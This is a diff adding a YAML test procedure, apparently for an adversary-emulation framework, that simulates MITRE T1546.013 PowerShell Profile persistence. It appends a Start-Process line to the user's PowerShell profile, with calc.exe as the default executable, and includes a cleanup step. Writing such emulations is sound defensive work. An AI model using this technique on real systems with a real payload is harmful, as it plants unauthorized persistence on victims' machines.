@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: Append malicious start-process cmdlet
+description: |
+    Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.
+args:
+    - name: exe_path
+      type: path
+      default: calc.exe
+    - name: ps_profile
+      type: string
+      default: $profile
+uuid: 090e5aa5-32b6-473b-a49b-21e843a56896
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1546: Event Triggered Execution'
+    subtechniques:
+        - 'T1546.013: PowerShell Profile'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: append-malicious-start-process-cmdlet
+      inline: |
+        Add-Content {{.Args.ps_profile}} -Value ""
+        Add-Content {{.Args.ps_profile}} -Value "Start-Process {{.Args.exe_path}}"
+        powershell -Command exit
+      executor: powershell
+      cleanup:
+        inline: |
+            $oldprofile = cat $profile | Select-Object -skiplast 1
+            Set-Content $profile -Value $oldprofile
+        executor: powershell
